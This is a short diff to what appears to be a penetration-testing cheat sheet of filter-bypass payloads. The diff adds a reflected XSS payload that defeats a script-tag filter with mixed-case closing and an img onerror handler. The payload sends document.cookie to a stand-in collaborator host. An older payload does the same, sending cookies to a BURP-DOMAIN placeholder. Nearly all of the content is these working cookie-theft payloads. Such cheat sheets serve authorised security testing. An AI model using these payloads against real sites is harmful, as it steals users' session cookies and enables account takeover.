@@ -6,6 +6,10 @@ Path traversal bypass filter
 Reflected XSS bypass filter
 
 ```html
+</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>
+```
+
+```html
 \'</ScRiPt ><img src=a onerror="window.location=`http://BURP-DOMAIN/?cookie=`+document.cookie">
 ```
 
